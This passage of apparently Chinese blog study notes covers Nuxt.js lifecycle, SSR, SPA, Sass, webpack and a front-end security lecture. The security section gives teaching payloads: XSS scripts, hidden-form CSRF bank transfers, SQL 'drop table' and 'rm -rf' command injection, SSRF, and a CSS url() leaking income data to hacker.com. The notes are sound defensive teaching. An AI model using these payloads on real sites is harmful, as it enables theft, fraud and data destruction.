生命周期","content":"\n## asyncData\n> 可能想要在服务器端获取并渲染数据。Nuxt.js添加了asyncData方法使得你能够在渲染组件之前异步获取数据。\n\nasyncData 是最常用最重要的生命周期，同时也是服务端渲染的关键点。\n该生命周期只限于页面组件调用，第一个参数为 context。\n它调用的时机在组件初始化之前，运作在服务端环境。\n所以在 asyncData 生命周期中，我们**无法通过 this 引用当前的 Vue 实例**，也**没有 window 对象和 document 对象**，这些是我们需要注意的。\n一般在 asyncData 会对主要**页面数据进行预先请求**，获取到的数据会交由服务端拼接成 html 返回前端渲染，以此提高首屏加载速度和进行 seo 优化。\n\n\n## fecth\n> 用于在渲染页面前填充应用的状态树（store）数据， 与 asyncData 方法类似，不同的是它**不会设置组件的数据。**\n\n得知该生命周期用于填充 Vuex 状态树，与 asyncData 同样，它在组件初始化前调用，第一个参数为 context。但这并不是说我们只能在 fetch 中填充状态树，在 asyncData 中同样可以。\n\n## validate\n> 但这并不是说我们只能在 fetch 中填充状态树，在 asyncData 中同样可以。\n\n在验证路由参数合法性时，它能够帮助我们，第一个参数为 context。与上面有点不同的是，我们能够访问实例上的方法 this.methods.xxx。\n\n\n## watchQuery\n> 监听参数字符串更改并在更改时执行组件方法 (asyncData, fetch, validate, layout, ...)\n\nwatchQuery 可设置 Boolean 或 Array (默认: [])。使用 watchQuery 属性可以监听参数字符串的更改。 如果定义的字符串发生变化，将调用所有组件方法(asyncData, fetch, validate, layout, ...)。 为了提高性能，默认情况下禁用。\n使用 watchQuery有点好处就是，当我们使用浏览器后退按钮或前进按钮时，页面数据会刷新，因为参数字符串发生了变化。\n\n## head\n> Nuxt.js 使用了 vue-meta 更新应用的 头部标签(Head) 和 html 属性。\n\n使用 head 方法设置当前页面的头部标签，该方法里能通过 this 获取组件的数据。\n除了好看以外，正确的设置 meta 标签，还能有利于页面被搜索引擎查找，进行 seo 优化。\n一般都会设置 description(简介) 和 keyword(关键词)。\n\n\n## 生命周期的调用顺序\n\nvalidate  =>  asyncData  =>  fetch  =>  head\n\n> 参考链接 https://juejin.cn/post/6844904160324747278#heading-12","tags":["ssr"],"categories":["workNotes"]},{"title":"ssr - Server Side Render","url":"/workNotes/work/03 ssr","content":"\n> 参考链接：https://juejin.cn/post/7002198277462442014\n\n服务端渲染 ssr，是指一种传统的渲染开发方式，就是在页面请求url的时候，**服务端将我们需要的 html 文本组装好，并返回给浏览器**，这个HTML文本被浏览器解析之后，不需要**经过 JavaScript 脚本的执行，即可直接构建出希望的 DOM 树**并展示到页面中。\n\nssr 有两种模式，单页面 和 非单页面 模式\n\n+ 单页面：后端首次渲染的单页面应用\n+ 非单页面：完全使用后端路由的后端模版渲染模式\n\n> 区别于 使用后端路由的程度\n\n## csr - Client Side Render\n\ncsr与ssr其对应的，一种目前流行的渲染方式，它**依赖的是运行在客户端的JS**，用户首次发送请求**只能得到小部分的指引性HTML代码**。第二次请求将会请求更多包含HTML字符串的JS文件。\n\n## 需要ssr的原因\n\nSPA应用的**首屏打开速度很慢**，因为用户首次加载需要先下载SPA框架及应用程序的代码，然后再渲染页面，且 **SPA 应用不利于 SEO 优化**。\n\n想着是不是可以**将应用首页先加载出来，然后让首页用不到的其他 JS 文件再慢慢加载**。但是由于 JS 引擎是单线程的，数据的组装过程会受到阻塞，单靠浏览器端的话不容易实现。\n\nSSR 契机就在此，如果**将组装数据、渲染 HTML 页面的过程放在服务端**，而**浏览器端只负责显示接收到的 HTML 文**件，那首屏的打开速度无疑会快很多。\n\n## 优缺点\n\n+ 优点\n  + **更快的响应时间**，相对于客户端渲染，服务端渲染在浏览器请求URL之后已经**得到了一个带有数据的HTML文本**，浏览器只需要解析HTML，直接构建DOM树就可以\n  + **有利于 SEO** ，可以**将 SEO 的关键信息直接在后台就渲染成 HTML，而保证搜索引擎的爬虫都能爬取到关键数据**，然后在别人使用搜索引擎搜索相关的内容时，你的网页排行能靠得更前，这样你的流量就有越高。\n+ 缺点\n  + 相**对于只需要提供静态文件的服务器**，SSR中使用的渲染程序自然会**占用更多的CPU和内存资源**\n  + 一些**常用的浏览器API可能无法正常使用**，比如`window`、`docment`和`alert`等，如果使用的话需要对运行的环境加以判断\n  + 开发调试会有一些麻烦，因为涉及了浏览器及服务器，对于**SPA的一些组件的生命周期的管理会变得复杂**\n  + 可能会由于某些因素导致服务器端渲染的结果与浏览器端的**结果不一致**\n+ 总结\n  + 最适用于静态展示页面，如果页面动态数据较多时需要谨慎使用。\n","tags":["vue"],"categories":["workNotes"]},{"title":"SPA单页面应用","url":"/workNotes/work/02 spa优缺点","content":"\n> 参考链接：https://juejin.cn/post/6950100237985775623\n\n单页面应用程序将所有的活动局限于一个Web页面中，在该Web页面初始化时加载相应的HTML、JavaScript 和 CSS。一旦页面加载完成，单页面应用不会因为用户的操作而进行页面的重新加载或跳转。取而代之的是利用 JavaScript 动态的变换HTML的内容，从而实现UI与用户的交互。由于避免了页面的重新加载，单页面应用可以提供较为流畅的用户体验。\n\n## 1. 优点\n\n+ 良好的交互体验\n  内容改变不需要重新加载整个页面，获取数据通过 ajax 异步获取，没有页面之间的切换，不会在跳转的时候出现 \"白屏现象\"，页面显示流畅。\n+ 良好的前后端工作分离模式\n  后端不负责模版渲染、输出页面工作，后端 api 通用化\n+ 减轻服务器压力\n  相对服务器压力小，服务器只用出数据就可以，不用管展示逻辑和页面合成，吞吐能力提高\n\n## 2. 缺点\n\n+ 首屏加载慢\n  解决：\n\n  1. vue-router 懒加载\n     vue-router 是按需加载组件，只有当路由被访问时才会加载对应组件，而不是在加载首页时加载，项目越大，对首屏加载的速度提升得越明显\n  2. 使用 cdn 加速\n     在做项目时，我们会用到很多库，采用cdn可以加快加载速度\n  3. 异步加载组件\n  4. 服务端渲染\n     也对 seo 优化起到作用，有利于搜索引擎抓取更多信息r\n     如果页面纯 前端渲染，搜索引擎抓取到的就只是空页面\n+ 不利于 seo\n\n  > seo 本质是 一个服务器向另一个服务器发请求，解析请求内容。\n  > 但一般来说搜索引擎是不会去执行请求到 js 的，即  **搜索引擎的基础爬虫的原理就是抓取 url，然后获取 html 源代码并解析**\n  > 如果是一个 spa ，html 在浏览器才渲染出数据， **seo 请求到的html 是模型页面 而不是 最终数据的 渲染页面**，这样就不利于内容被搜索引擎搜到\n  >\n\n  解决：\n\n  1. 服务端渲染 ssr\n     服务器合成完整的 html 文件再输出到浏览器\n  2. 页面预渲染\n  3. 路由采用 h5 history模式\n+ 不适合开发大型项目\n\n  > 有可能涉及大量 dom 操作、复杂动画效果\n  >\n","tags":["vue"],"categories":["workNotes"]},{"title":"Sass的使用 -- css 预处理器","url":"/workNotes/work/01 scss sass","content":"\n> 2022.02.18 在公司熟悉环境时看到用的 cass 所以先去了解\n> \n> 参考网站 https://www.sass.hk/guide/\n> \n> 介绍：https://juejin.cn/post/6844904169313140749\n> \n> 简洁区别：https://juejin.cn/post/6844904086676963341\n\n# sass css 预处理器\n\nCSS 预处理器定义了一种新的语言，其基本思想是，用一种专门的编程语言，为 CSS 增加了一些编程的特性，将 CSS 作为目标生成文件，然后开发者就只要使用这种语言进行CSS的编码工作。\n\n## 0.1 使用 预处理器的原因\nCSS仅仅是一个标记语言，不可以自定义变量，不可以引用。\n**CSS有具体以下几个缺点：**\n+ 语法不够强大，比如无法嵌套书写，导致模块化开发中需要书写很多重复的选择器；\n+ 没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护。\n+ 预编译很容易造成后代选择器的滥用\n\n**使用预处理器的优点:**\n+ 提供CSS层缺失的样式层复用机制\n+ 减少冗余代码\n+ 提高样式代码的可维护性\n\nSass 和 Less 这类语言，其实可以理解成 **CSS 的超集**，它们在CSS 原本的语法格式基础上，增加了编程语言的特性，如变量的使用、逻辑语句的支持、函数等。让 CSS 代码更容易维护和复用。\n\n但浏览器最终肯定是只认识 CSS 文件的，它无法处理 CSS 中的那些变量、逻辑语句，**所以需要有一个编译的过程，将 Sass 或 Less 写的代码转换成标准的 CSS 代码，这个过程就称为 CSS 预处理。**\n\n\n## 0.2 less & sass\n\n+ Less （Leaner Style Sheets 的缩写） 是一门向后兼容的 CSS 扩展语言。因为 Less 和 CSS 非常像，**Less 仅对 CSS 语言增加了少许方便的扩展，学习很容易** .\n\n+ sass，作为”世界上最成熟、最稳定、最强大的专业级CSS扩展语言”。**兼容所有版本的css，且有无数框架使用sass构建**，如Compass，Bourbon，和Susy。\n\n> SASS版本3.0之前的后缀名为.sass，而版本3.0之后的后缀名.scss。\n\n**相同之处：**\n1、混入(Mixins)—class中的class；\n2、参数混入—可以传递参数的class，就像函数一样；\n3、嵌套规则—Class中嵌套class，从而减少重复的代码；\n4、运算—CSS中用上数学；\n5、颜色功能—可以编辑颜色；\n6、名字空间(namespace)—分组样式，从而可以被调用；\n7、作用域—局部修改样式；\n8、JavaScript 赋值—在CSS中使用JavaScript表达式赋值。\n\n**不同之处：**\n\n> sass less\n\n+ 环境: dart或其他  |  基于javascript,可以运行在 Node 或浏览器\n+ 使用: 复杂  |  简单(相对而言)\n+ 功能: 复杂  |  简单(相对而言)\n+ 处理机制: 服务端处理  |  可以运行在 Node 或浏览器端\n变量: 以 $ 开头  |  以 @ 开头\n文件后缀: .sass 或. scss  |  .less\n\n+ 在Less中，**仅允许循环数值**。\n在Sass中，我们可以**遍历任何类型的数据**。但在Less中，我们只能使用递归函数循环数值。\n\n+ 条件语句\nLess 中并**不支持**条件语句，当然，可以通过内置函数 if 以及 and，or，not 这些来模拟条件语句。\n在 Sass 中是**支持**条件语句的，但也不是像其他编程语言直接 if 这样通过保留字来编写，需要加个 @ 符号\n\n\n## 1. 使用变量\n\nsass 使用 `$` 作为标识变量\n> 老版的 scss 使用 `!` 作为标识，改变的原因 -- 太丑了 ?\n\n1. 声明 引用\n    ~~~css\n    $highlight-color: #F90;\n    .selected {\n        border: $highlight-border;\n    }\n2. 变量名用中划线 / 下划线\n    随便、爱用啥用啥，且 sass 将其视为一样的，都指向一个变量\n\n\n## 2. 嵌套 css 规则\n~~~css \n    #content {\n        article {\n            h1 { color: #333 }\n            p { margin-bottom: 1.4em }\n        }\n        aside { background-color: #EEE }\n}\n\n~~~\n### 1.1 父选择器标识符 `&`\n~~~css\n        article a {\n            color: blue;\n            &:hover { color: red }\n        }\n        /*编译后*/\n        article a { color: blue }\n        article a:hover { color: red }\n~~~\n\n### 1.2 群组选择器 `,`\n~~~css\n.container {\n  h1, h2, h3 {margin-bottom: .8em}\n}\n~~~\n\n### 1.3 子组合选择器和同层组合选择器 `>` `+` `~`\n~~~css\n/* 子 */\narticle > section { border: 1px solid #ccc }\n\n/* 同层相邻组合 */\nheader + p { font-size: 1.1em }\n\n/* 同层全体组合 */\narticle ~ article { border-top: 1px dashed #ccc }\n~~~\n\n### 1.4 嵌套属性\n~~~css\nnav {\n  border: {\n  style: solid;\n  width: 1px;\n  color: #ccc;\n  }\n}\n\nnav {\n  border: 1px solid #ccc {\n  left: 0px;\n  right: 0px;\n  }\n}\n~~~\n\n## 3. 导入 sass 文件\n\n+ css 中不常用的特性：`@import` 规则，它允许在一个`css` 文件中导入其他 `css` 文件。然而，后果是**只有执行到 `@import` 时，浏览器才会去下载其他 `css` 文件，这导致页面加载起来特别慢。**\n\n+ sass也有一个@import规则，但不同的是，sass的@import规则在生成css文件时就把相关文件导入进来。这意味着所有相关的样式被归纳到了同一个css文件中，而无需发起额外的下载请求。\n\n### 3.1 局部文件 / 部分文件\n当通过@import把sass样式分散到多个文件时，你通常只想生成少数几个css文件。那些专门为@import命令而编写的sass文件，并不需要生成对应的独立css文件，这样的sass文件称为**局部文件**。\n\n此约定即，**sass局部文件的文件名以下划线开头**。这样，sass就不会在编译时单独编译这个文件输出css，而只把这个文件用作导入。当你@import一个局部文件时，还可以不写文件的全名，即省略文件名开头的下划线。\n\n\n### 3.2 默认变量值 `!default`\n~~~css\n$fancybox-width: 400px !default;\n.fancybox {\n    width: $fancybox-width;\n}\n~~~\n> 如果用户在导入你的sass局部文件之前声明了一个`$fancybox-width`变量，那么你的局部文件中对`$fancybox-width`赋值`400px`的操作就无效。如果用户没有做这样的声明，则`$fancybox-width`将默认为`400px`。\n\n### 3.3 嵌套导入\n跟原生的css不同，sass允许@import命令写在css规则内。这种导入方式下，生成对应的css文件时，局部文件会被直接插入到css规则内导入它的地方\n\n~~~css\n/*  blue-theme 文件 */\naside {\n  background: blue;\n  color: white;\n}\n\n\n/* 使用文件 */\n.blue-theme {@import \"blue-theme\"}\n.blue-theme {\n  aside {\n    background: blue;\n    color: #fff;\n  }\n}\n~~~\n\n### 3.4 原生 css 导入\n由于sass兼容原生的css，所以它也支持原生的CSS `@import`。\n尽管通常在sass中使用`@import`时，sass会尝试找到对应的sass文件并导入进来，但在下列三种情况下会生成原生的CSS`@import`，这会造成浏览器解析css时的额外下载：\n+ 被导入文件的名字以.css结尾；\n+ 被导入文件的名字是一个URL地址（比如http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务；\n+ 被导入文件的名字是CSS的url()值。\n\nso 不能用sass的@import直接导入一个原始的css文件，因为sass会认为你想用css原生的@import。\n\n但是，因为sass的语法完全兼容css，所以你可以**把原始的css文件改名为.scss后缀，即可直接导入了**\n\n\n## 4. 静默注释\n\nsass 提供了一种不同于 css 标准的注释格式 `//` , 在编译成 css 后，这些用 `//` 的注释语句都会被抹去\n\n## 5. 混合器 `@mixin` `@include`\n需要大段大段的重用样式的代码，可以通过sass的混合器实现大段样式的重用。\n\n混合器使用`@mixin`标识符定义。这个标识符给一大段样式赋予一个名字，可以通过引用这个名字重用这段样式\n\n~~~css\n@mixin rounded-corners {\n  -moz-border-radius: 5px;\n  -webkit-border-radius: 5px;\n  border-radius: 5px;\n}\n\nnotice {\n  background-color: green;\n  border: 2px solid #00aa00;\n  @include rounded-corners;\n}\n\n/* less */\n.post a {\n  color: red;\n  rounded-corners();\n}\n~~~\n\n### 5.1 使用混合器的时间\n混合器是在样式表中应用的。混合器是展示性的描述，用来描述一条css规则应用之后会产生怎样的效果。\n\n混合器和类配合使用写出整洁的html和css，因为使用语义化的类名亦可以帮你避免重复使用混合器。\n\n### 5.2 混合器中css规则\n不仅可以包含属性，也可以包含css规则，包含选择器和选择器中的属性\n~~~css\n@mixin no-bullets {\n  list-style: none;\n  li {\n    list-style-image: none;\n    list-style-type: none;\n    margin-left: 0px;\n  }\n}\n~~~\n\n### 5.3 给混合器传参\n可以通过在@include混合器时给混合器传参，来定制混合器生成的精确样式\n\n~~~css\n@mixin link-colors($normal, $hover, $visited) {\n  color: $normal;\n  &:hover { color: $hover; }\n  &:visited { color: $visited; }\n}\n\na {\n  @include link-colors(blue, red, green);\n}\n\n/* 通过$name: value的形式指定每个参数的值 */\na {\n    @include link-colors(\n      $normal: blue,\n      $visited: green,\n      $hover: red\n  );\n}\n~~~\n\n### 5.4 默认参数值\n 参数默认值使用$name: default-value的声明形式，默认值可以是任何有效的css属性值，甚至是其他参数的引用\n~~~css\n@mixin link-colors(\n    $normal,\n    $hover: $normal,\n    $visited: $normal\n  ){\n  color: $normal;\n  &:hover { color: $hover; }\n  &:visited { color: $visited; }\n}\n\n~~~\n\n## 6. 使用选择器继承 `@extend`\n> if 想重用语义化\n\n~~~css\n.error {\n  border: 1px solid red;\n  background-color: #fdd;\n}\n.seriousError {\n  @extend .error;\n  border-width: 3px;\n}\n~~~\n> `.seriousError`将会继承样式表中任何位置处为`.error`定义的所有样式\n== \n以`class=\"seriousError\"` 修饰的html元素最终的展示效果就好像是`class=\"seriousError error\"`。\n\n### 6.1 什么时候使用继承\n**混合器**主要用于展示性样式的重用，而类名用于语义化样式的重用。因为**继承是基于类**的（有时是基于其他类型的选择器），所以继承应该是建立在语义化的关系上。\n\n### 6.2 继承的高级用法\n最常用的一种高级用法是继承一个html元素的样式。尽管默认的浏览器样式不会被继承，因为它们不属于样式表中的样式，但是你对html元素添加的所有样式都会被继承\n\n~~~css\n.disabled {\n  color: gray;\n  @extend a;\n}\n.disabled {\n  color: gray;\n  @extend a;\n}\n~~~\n> if 一条样式规则继承了一个复杂的选择器，那么它只会继承这个复杂选择器命中的元素所应用的样式\n\n\n### 6.3 继承的工作细节\n`@extend`背后最基本的想法是: \n如果`.seriousError @extend .error`， 那么样式表中的任何一处`.error`都用`.error.seriousError`这一选择器组进行替换。这就意味着相关样式会如预期那样应用到`.error`和`.seriousError`\n\n> + 跟混合器相比，**继承生成的css代码相对更少**。\n因为**继承仅仅是重复选择器，而不会重复属性**，所以使用继承往往比混合器生成的css体积更小。如果你非常关心你站点的速度，请牢记这一点。\n+ **继承遵从css层叠**的规则。当两个不同的css规则应用到同一个html元素上时，并且这两个不同的css规则对同一属性的修饰存在不同的值，根据权重选择。\n+ **混合器本身不会引起css层叠的问题**，因为混合器把样式直接放到了css规则中，而继承存在样式层叠的问题。被继承的样式会保持原有定义位置和选择器权重不变。\n\n","tags":["css"],"categories":["workNotes"]},{"title":"WEB 开发的安全之旅 - 字节青训营","url":"/learningNotes/ByteDance/10 刘宇晨 web 开发的安全之旅","content":"\n\n> 两个角度看安全：hacker 攻击、开发者 防御\n\n## 攻击者\n\n### XSS — Cross-Site Scripting\n\n攻击者在网站上提交一段恶意脚本 \\<script>\\</script> ，网站将其当成自身dom执行编译。\n\n \n\n+ 主要利用了：\n  + 盲目信任用户提交内容\n  + 把用户提交的string 直接转化为 DOM\n    + document.write\n    + element.innerHTML = anyString;\n    + SSR(user_data) \n\n+ 特点：\n  + 难以从 UI 上感知，暗地执行脚本\n  +  窃取用户信息 cookie/token\n  + 绘制 UI 例如弹窗，诱骗用户点击 / 填写表单\n\n\n\n#### 存储型 Stored XSS：\n\n+ 恶意脚本被**存放在数据库**中\n+ 访问页面 -> 读数据 == 被攻击\n+ 危害最大，对全部用户都可见\n\n#### 反射型 Reflected：\n\n+ 不涉及数据库\n\n+ **从 URL 上攻击**\n\n  ~~~js\n  // 例如 url 为 \n  // host/path/?param=<script>alert('123')</script>\n  public async render(ctx){\n      const { param } = ctx.query;\n      ctx.status = 200;\n      ctx.body = `<div>${ param }</div>`\n  }\n  ~~~\n  \n  \n\n#### 基于 dom DOM-based：\n\n+ 不需要服务器的参与\n\n+ 恶意攻击的发起 + 执行，**全在浏览器完成**\n\n  ~~~js\n  // 例如 url 为 \n  // host/path/?param=<script>alert('123')</script>\n  const content = new URL(location.href).searchParams.get(\"param\");\n  const div = document.createElement('div');\n  div.innerHTML = content;\n  document.body.append(div)\n  ~~~\n\n  > 与反射型很像，区别在于 完成注入脚本的地方：反射型在 server端、DOM 在浏览器完成闭环\n\n####  基于 mutation Mutation-based：\n\n+ 利用了浏览器渲染 DOM 的特性 – 独特优化\n\n+ 不同浏览器，会有区别 – 按浏览器进行攻击\n\n  ~~~html\n  <noscript><p title=\"</noscript><img src=x onerror=alert()>\">\n  // 为\n  <div>\n      <noscript> <p title=\" </noscript>\n      <img src=\"x\" onerror=\"alert(1)\">\n      \"\"\">\"\n  </div>\n  ~~~\n\n  \n\n\n\n### CSRF 跨站伪造请求 — Cross-site request forgery\n\n在用户不知情的前提下，利用用户权限 cookie，构造指定 HTTP 请求，窃取或修改用户铭感信息\n\n例子：银行转账\n\n#### GET\n\n~~~html\n<a href=\"https://bank.com/transfer?to=hacker&amount=100\">点我抽奖</a>\n    \n<img style=\"display:none;\" src=\"https://bank.com/transfer?to=hacker&amount=100\" />\n~~~\n\n#### POST\n\n~~~html\n<form action=\"https://bank.com/transfer_tons_of_money\" method=\"POST\">\n    <input name=\"amount\" value=\"10000\" type=\"hidden\"/>\n    <input name=\"to\" value=\"hacker\" type=\"hidden\"/>\n</from>\n~~~\n\n\n\n### Injection 注入 \n\n#### SQL\n\n请求：SQL 参数 恶意注入\n\nServer：运行 SQL code\n\n获取其他数据、修改数据、删除数据…\n\n~~~js\n// 读取请求字段  直接以字符串的形式拼接 SQL 语句\npublic async renderForm(ctx){\n    const { username, form_id } = ctx.query;\n    const result = await aql.query(`\n\t\tselect a,b,c from table\n\t\twhere username = ${username}\n\t\tand form_id = ${ from_id }\n\t`);\n    ctx.body = renderForm(result);\n}\n\n// 攻击者\nfetch(\"/api\",{\n    method:\"POST\",\n    headers:{\n        \"Content-Type\":\"application/json\"\n    },\n    body:JSON.stringify({\n        username: \"any; drop table tabelname;\"\n    })\n})\n\n// 造成 select xxx from xxx drop table tablename 删库跑路\n~~~\n\n\n\n#### Injection 不止于 SQL\n\n+ CLI 命令行\n\n+ OS command 系统命令\n\n  ~~~js\n  // 视频格式转换\n  public async convertVideo(ctx){\n      const { video, options } = ctx.request.body;\n      exec(`convert-cli ${ video } -o ${ options }`);\n      ctx.body = \"ok\";\n  } \n  \n  // 攻击\n  fetch(\"/api\", {\n      method: \"POST\",\n      body: JSON.stringify({\n          options:`' && rm -rf xxx`\n      })\n  });\n  \n  // 生成 删除系统文件的命令 \n  const command = `convert-cli video -o && rm -rf xxx`\n  \n  ~~~\n\n  > 除了删除还能进行 读取 修改\n\n+ Server-Side Request Forgery — ssrf，服务端伪造请求\n\n  > 严格上说不是 injection ，但是原理类似\n\n  ~~~js\n  // 请求 用户自定义 的callback url\n  // web server 通常有内网访问权限\n  public async webhook(ctx){\n      // callback 可能是内网 url \n      // e.g http://secret.com/get_employ_payrolls\n      ctx.body = await fetch(ctx.query.callback);\n  }\n  \n  // 访问 callback === 暴露内网信息\n  ~~~\n\n  \n\n### Dos — Denial of Service\n\n通过某种方式 构造特定请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求挤压，进而雪崩效应\n\n#### ReDos：基于正则表达式的 Dos\n\n贪婪：n 次不行？n-1次再试试 — 回溯\n\n> 正则表达式的贪婪模式：\n>\n> 重复匹配时 `?`  与 `no ?`  满足`一个即可 ` 与 `尽量多`\n>\n> ~~~js\n> const greedyRegExp = \"/a+/\";  // 有多少匹配多少\n> const nonGreedyRegExp = \"/a+?/\" // 有一个就可以\n> const str = \"aaaaa\";\n> console.log(str.match(greedyRegExp)[0]) //aaaaa\n> console.log(str.match(nonGreedyRegExp)[0]) //a\n> ~~~\n\n\n\n#### Logical Dos\n\n+ 耗时的同步操作\n+ 数据库写入\n+ SQL join\n+ 文件备份\n+ 循环执行逻辑\n\n\n\n#### DDos — Distributed Dos \n\n短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积，进而雪崩效应，无法响应新请求。\n\n特点：直接访问 IP、任意 API、消耗大量带宽\n\ndemo：SYN Flood 洪水攻击：攻击者发送很多 SYN 与服务器进行连接，但是不进行确认连接，\n\n​              导致，握手没有完成， connection 不能被释放，达到最大可连接数，无法连接新请求\n\n\n\n### 传输层 — 中间人攻击\n\n<img src = 'https://i.bmp.ovh/imgs/2022/01/3c7be4efb4995095.png' style=\"zoom: 50%;\" />\n\n原因：\n\n+ 明文传输\n+ 信息篡改不可知\n+ 对方身份未验证\n\n\n\n## 防御篇\n\n### XSS\n\n+ 永远不信任用户的提交内容\n+ 不要将用户提交内容直接转换成 DOM\n\n+ 现成工具：\n  + 前端：主流框架默认防御 xss、google-closure-library\n  + 服务端 node：DOMPurify\n\n+ 用户需求：需要动态生成 DOM，需要注意的点：\n  + string 转 DOM：注意转译 new DOMParse()\n\n  + 上传 svg：对其进行扫描，避免生成图片\n\n    ~~~html\n    <svg>\n        <script>alert(\"xss\")</script>\n    </svg>\n    ~~~\n\n  + 自定义跳转链接：要过滤，因为可以写js\n\n    ~~~html\n    <a href=\"javascript:alert('xss')\"></a>\n    ~~~\n\n  + 自定义样式：\n\n    ~~~css\n    input[type=radio].income-gt10k:checked{\n        background: url(\"https://hacker.com/?income=gt10k\")\n    }\n    ~~~\n\n    \n\n### CSP - Content Security Policy 内容安全策略\n\n+ 哪些源被认为是安全的\n+ 来自安全源的脚本可以执行，否则直接抛错\n+ 禁止 eval + inline script \n\n设置的方式：\n\n1. 服务器的响应头部：\n\n   ~~~js\n   Content-Security-Policy: script-src 'self' // 同源\n   Content-Security-Policy: script-src 'self' https://domain.com //同源加 后面这个可以访问\n   ~~~\n\n2. 浏览器 meta：\n\n   ~~~html\n   <meta htpp-eqiuv=\"Content-Security-Policy\" content=\"script-src self\" />\n   ~~~\n\n   \n\n### CSRF\n\n因为其是**伪造请求**，是**异常来源**，then **限制请求来源**，也就**限制了 伪造请求**\n\n+ 方法\n  + 服务端开发人员可以通过校验 **Origin (同源请求中，GET + HEAD 不发送)，Referer（更广泛应用）**\n\n  + token：\n\n    Browser      →1. 请求页面 →            Server\n\n    ​                    ← 2.页面 + token ←\n\n    ​                     →3. 请求API+token →\n\n    ​                     ← 4.验证 token + 数据←\n\n  注意：\n\n  1. 要进行用户绑定 \n  2. 要设置过期时间\n\n  > 因为 请求来自合法页面，服务器接收过页面请求，服务器就可以表示\n\n#### CSRF — iframe 攻击\n\n因为这样就是同源的发送请求了，没办法用 Origin 限制了，\n\n+ 方法\n\n  使用 响应头部：`X-Frame-Options:deny/sameorigin`\n\n  deny：不能访问\n\n  sameorigin：同源可以访问\n\n#### CSRF anti-pattern\n\nGET != GET + POST、明确 get、post 请求各自的功能\n\n> 如果写成下面的样子，攻击者很容易一石二鸟\n\n~~~js\n// 将更新 获取 逻辑放到同一个 get\npublic async getAndUpdate(ctx){\n    const { update, id } = ctx.query;\n    if(update){\n        await this.update(update);\n    }\n    ctx.body = await this.get(id);\n}\n~~~\n\n\n\n#### 避免用户信息被携带：SameSite Cookie\n\n从根源上解决了 csrf，csrf 是利用用户权限及 cookie，去伪造自己是该用户来进行恶意操作，如果攻击者无法获取到 用户的 cookie 那就没用办法进行伪造了。\n\nsameSite 限制了 **cookie domain、页面域名；**\n\n> 如果是有 cookie 依赖第三方服务的，可以设置 \n>\n> `Set-Cookie: SameSite=None; Secure;`\n\n\n\nSameSite 与 CORS 对比：\n\nSameSite：Cookie 发送、domain 与 页面域名\n\nCORS：资源读写 http请求、资源域名 与 页面域名、白名单\n\n\n\n#### 正确防御 CSRF — 中间件\n\n\n\n## Injection\n\n#### SQL\n\n找到项目中查询 SQL 的地方，使用 prepared statement\n\n#### beyond SQL\n\n1. 最小权限原则\n\n   不允许访问 sudo || root\n\n2. 建立允许名单 + 过滤\n\n   不允许进行 rm 这种系统操作\n\n3. 对 URL 类型参数进行协议、域名、ip等限制\n\n   禁止访问内网\n\n\n\n## DoS\n\n#### Regex DoS\n\n1. 进行 code review，避免出现 贪婪模式的 正则\n2. 代码扫描 + 正则性能测试\n3. 禁止使用用户提供的正则\n\n#### Logical Dos\n\n1. 不是非黑即白：有些情况只有再在请求量大到一定之后才会体现\n2. 分析代码中的性能瓶颈\n3. 限流\n\n#### DDos\n\n1. 流量治理\n   + 负载均衡 – 过滤\n   + api 网关 – 过滤\n   + cdn – 抗量\n2. 快速自动扩容 – 抗量 \n3. 非核心服务降级 – 抗量\n\n\n\n## 传输层 — 防御中间人\n\n使用 https = http + TLS\n\nhttps的特性：\n\n+ 可靠性：加密，非明文传输\n+ 完整性：MAC 验证，禁止篡改   — 通过 验证 hash\n+ 不可抵赖性：数字签名，进行身份验证  — 密码学\n\n\n\n#### HSTS - HTTP Strict-Transport-Security\n\n将 HTTP 升级到 HTTPS\n\n设置请求头：`Strict-Transport-Security：max-age=3600`\n\n#### SRI — Subresource Integrity\n\n防止 CDN 静态资源被篡改：对比 hash\n\n\n\n#### Feature / Permission Policy\n\n限制一个页面下，可以使用哪些功能\n\niframe 也可以通过 allow=“xxx” 设置\n\n","tags":["青训营","前端安全"],"categories":["learningNotes"]},{"title":"构建 webpack 知识体系 - 字节青训营","url":"/learningNotes/ByteDance/12 李文杰 webpack","content":"\n# 构建 webpack 知识体系\n\n知识体系：https://gitmind.cn/app/doc/fac1c196e29b8f9052239f16cff7d4c7\n\n## 1. 什么是webpack\n\n本质上是一种前端资源编译、打包工具\n\n+ 多份资源文件打包成一个Bundle\n+ 支持 Babel、Eslint、TS、CoffeScript、Less、Sass\n+ 支持模块化处理 css、图片等资源文件\n+ 支持 HMR + 开发服务器\n+ 支持持续监听、持续构建\n+ 支持代码分离\n+ 支持 Tree-shaking\n+ 支持 Sourcemap\n+ …\n\n## 2. 使用 webpack\n\n### 1. 示例\n\n1. 安装\n\n   `npm i -D webpack webpack-cli`\n\n2. 编辑配置文件\n\n   ~~~js\n   // webpack.config.js\n   module.exports = {\n       entry:\"main.js\",\n       output:{\n           filename:\"[name].js\",\n           path:path.join(__dirname,\"./dist\"),\n       },\n       module:{\n           rules:[{\n               test:/\\.less$/i,\n               use:['style-loader','css-loader','less-loader']\n           }]\n       }\n   }\n   ~~~\n\n3. 执行编译命令\n\n   `npx webpack`\n\n### 2. 核心流程 — 极简化版\n\n1. 入口处理 ： 从entry文件开始启动编译流程\n2. 依赖解析 ：根据require、import等找到依赖资源\n3. 资源解析 ：根据module配置，调用资源转移器，将css等非标准js资源转译为 js 内容\n4. 资源合并打包 ：将转译后的资源内容合并打包为可直接在浏览器运行的js\n\n\n\n### 3. 配置项概览\n\n 使用 webpack 的方法：**基本围绕 “配置”展开，可分为**\n\n+ 流程类：作用于流程中某个 or 若干个环节，直接影响打包效果的配置项\n  + 输入：entry、context\n  + 模块解析：resolve、externals\n  + 模块转译：module\n  + 后处理：optimization、mode、target\n+ 工具类：主流程之外，提供更多工程化能力的配置项\n  + 开发效率类：watch、devtool、devServer\n  + 性能优化类：cache、performance\n  + 日志类：stats、infrastructureLogging\n  + 其他：amd、bail\n\n\n\n配置项的使用频率：\n\n+ entry/output\n+ module/plugins\n+ mode\n+ watch/devServer/devtools\n\n#### 3.1 处理 css – style-loader,css-loader\n\n1. 安装loader\n2. 编辑配置项\n\n> loader 有什么作用？为什么要用到 css-loader、style-loader？\n>\n> A: 因为 webpack 只认识 